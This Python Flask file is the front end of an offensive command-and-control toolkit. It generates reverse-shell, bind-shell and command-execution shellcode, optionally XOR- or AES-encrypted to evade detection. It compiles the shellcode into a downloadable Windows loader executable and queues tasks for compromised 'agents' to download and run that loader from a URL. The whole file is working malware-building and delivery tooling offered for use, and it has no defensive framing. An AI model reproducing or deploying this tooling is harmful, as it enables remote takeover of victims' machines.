from flask import Flask, render_template, request, jsonify, send_file
from modules.shellcode_generator import ShellcodeGenerator
import os
import sys

# Add the parent directory to the path to import from C2_Server
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from C2_Server.generate_loader import generate_loader

app = Flask(__name__)
shellcode_gen = ShellcodeGenerator()

@app.route('/')
def index():
    return render_template('shellcode.html')

@app.route('/generate', methods=['POST'])
def generate_shellcode():
    try:
        data = request.get_json()
        shellcode_type = data.get('type')
        platform = data.get('platform', 'windows')
        encoding = data.get('encoding', 'base64')
        encryption = data.get('encryption', 'none')
        key = data.get('key', '')
        shellcode = None

        if shellcode_type == 'reverse_shell':
            host = data.get('host')
            port = data.get('port')

            if not host or not port:
                return jsonify({'error': 'Host and port are required for reverse shell'}), 400

            try:
                port = int(port)
            except ValueError:
                return jsonify({'error': 'Port must be an integer'}), 400

            shellcode = shellcode_gen.generate_reverse_shell(host, port, platform)

        elif shellcode_type == 'bind_shell':
            port = data.get('port')

            if not port:
                return jsonify({'error': 'Port is required for bind shell'}), 400

            try:
                port = int(port)
            except ValueError:
                return jsonify({'error': 'Port must be an integer'}), 400

            shellcode = shellcode_gen.generate_bind_shell(port, platform)

        elif shellcode_type == 'exec':
            command = data.get('command')

            if not command:
                return jsonify({'error': 'Command is required for exec shellcode'}), 400

            shellcode = shellcode_gen.generate_exec(command, platform)

        else:
            return jsonify({'error': 'Invalid shellcode type'}), 400

        if shellcode is None:
            return jsonify({'error': 'Failed to generate shellcode'}), 500

        # Apply encryption if needed
        if encryption != 'none':
            if encryption == 'xor':
                shellcode = shellcode_gen.xor_encrypt(shellcode, key or 'defaultxor')
            elif encryption == 'aes':
                shellcode = shellcode_gen.aes_encrypt(shellcode, key or 'defaultaes')

        # Encode shellcode
        encoded_shellcode = shellcode_gen.encode_shellcode(shellcode, encoding)
        if encoded_shellcode is None:
            return jsonify({'error': 'Failed to encode shellcode'}), 500

        return jsonify({
            'success': True,
            'shellcode': encoded_shellcode.decode() if isinstance(encoded_shellcode, bytes) else encoded_shellcode,
            'encoding': encoding
        })

    except Exception as e:
        return jsonify({'error': f'Unexpected server error: {str(e)}'}), 500

@app.route('/generate_loader_exe', methods=['POST'])
def generate_loader_exe():
    """
    Generate an executable loader for the provided shellcode
    
    Expected JSON payload:
    {
        "shellcode": "base64_encoded_shellcode"
    }
    
    Returns:
        The compiled executable file for download
    """
    try:
        data = request.get_json()
        shellcode_b64 = data.get('shellcode')
        
        if not shellcode_b64:
            return jsonify({'error': 'Shellcode is required'}), 400
            
        # Generate loader executable
        exe_path = generate_loader(shellcode_b64)
        
        if not exe_path or not os.path.exists(exe_path):
            return jsonify({'error': 'Failed to generate loader executable. Check if MinGW is installed.'}), 500
            
        # Return the file for download
        return send_file(
            exe_path,
            as_attachment=True,
            download_name="shellcode_loader.exe",
            mimetype="application/octet-stream"
        )
        
    except Exception as e:
        return jsonify({'error': f'Error generating loader: {str(e)}'}), 500

@app.route('/api/tasks', methods=['POST'])
def create_task():
    """
    Create a task for an agent to execute the loader
    
    Expected JSON payload:
    {
        "agent_id": "agent_identifier",
        "loader_url": "url_to_download_loader"
    }
    
    Returns:
        Task ID and status
    """
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        loader_url = data.get('loader_url')
        
        if not agent_id or not loader_url:
            return jsonify({'error': 'Agent ID and loader URL are required'}), 400
            
        # Create task data
        task_data = {
            'module': 'run_loader',
            'params': {
                'loader_url': loader_url
            }
        }
        
        # In a real implementation, this would be sent to your C2 server's task queue
        # For this example, we'll just return success
        task_id = f"task_{os.urandom(4).hex()}"
        
        return jsonify({
            'success': True,
            'task_id': task_id,
            'message': f'Task created for agent {agent_id} to run loader from {loader_url}'
        })
        
    except Exception as e:
        return jsonify({'error': f'Error creating task: {str(e)}'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)
